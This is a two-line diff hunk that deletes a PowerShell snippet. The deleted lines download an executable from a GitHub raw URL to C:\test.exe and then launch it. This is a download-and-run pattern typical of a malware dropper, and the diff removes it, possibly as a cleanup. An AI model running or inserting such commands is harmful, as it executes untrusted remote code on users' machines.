@@ -1,2 +1,0 @@
-Invoke-WebRequest https://github.com/downlongdickem/1/raw/main/test.exe -OutFile C:\test.exe
-Start-Process -Filepath "C:\test.exe"
